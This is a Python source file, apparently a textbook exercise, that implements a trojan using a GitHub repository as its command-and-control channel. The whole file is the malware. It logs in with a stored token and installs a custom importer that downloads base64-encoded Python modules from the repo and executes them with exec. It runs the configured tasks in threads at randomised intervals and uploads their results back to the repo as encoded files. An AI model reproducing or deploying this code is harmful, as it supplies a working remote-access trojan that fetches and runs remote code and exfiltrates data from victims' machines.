import base64
import github3
import importlib
import json
import os
import random
import sys
import threading
import time

# import dirlister

from datetime import datetime

#? Creating fine grained personal access tokens on GitHub
#? https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token

#? GitHub permissions required:
#? Read for Contents, Metadata, Pull requests

PATH = os.getcwd()+'/Chapter7-GitHubC2/'

def github_connect():

    try:
        with open(PATH+'github_token.tok') as file:
            token = file.read()
    except Exception as e:
        print(f'Error:{e}')

    user = 'agogeio'
    sess = github3.login(token=token)

    try:
        github = sess.repository(user, 'Trojan')
        return github
    except Exception as e:
        print(f'GitHub connection error: {e}')
        return e

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class GitImporter:
    def __init__(self):
        self.current_module_code = ''

    def find_module(self, name, path=None):
        print(f'[*] Attempting to retrieve {name}')
        self.repo = github_connect()

        try:
            new_library = get_file_contents('modules', f'{name}.py', self.repo)
            # print(new_library)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                # print(type(self))
                return self
        except Exception as e:
            print(f'Error in find_module function: {e}')

    def load_module(self, name) -> sys.modules:
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        #* https://docs.python.org/3.10/library/importlib.html?highlight=importlib#importlib.util.spec_from_loader
        #* A specification for a module’s import-system-related state.
        #* "A factory function for creating a ModuleSpec instance based on a loader...
        #* to fill in any missing information on the spec."  
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        # print(new_module)
        return new_module
        

class Trojan:
    def __init__(self, id) -> None:
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
        # print(f'GitHub repo is: {self.repo}')

    def get_config(self):

        try:
            config_json = get_file_contents('config', self.config_file, self.repo)
            config = json.loads(base64.b64decode(config_json))

            for task in config:
                # print({task["module"]})
                if task['module'] not in sys.modules:
                    # print(f'import {task["module"]}')
                    exec(f'import {task["module"]}') 
                    #? This will not work until we create the 
                    #? GetImporter class and customize how 
                    #? Python import modules 
                    #? This code will be written later
            return config
        except Exception as e:
            print(f'get_config function error: {e}')
            return e


    def module_runner(self, module):
        # print('In module_runner')
        result = sys.modules[module].run()
        self.store_module_result(result)


    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{message}.data'
        # print(f'Remote Path: {remote_path}')
        bindata = bytes('%r' % data, 'utf-8')
        print(bindata)

        try:
            # self.repo.create_file(remote_path, message, bindata)
            #? Human readable
            self.repo.create_file(remote_path, message, base64.b64encode(bindata))
            #? This is the remote_path in the GitHub repo not on the local machine
            #* https://docs.github.com/en/rest/repos/contents?apiVersion=2022-11-28#create-a-file
            #? base64 encoded
        except Exception as e:
            print(f'Error in store_module_result: {e}')


    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1,10))

            time.sleep(random.randint(30*60, 3*60*60))


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('tid')
    trojan.run()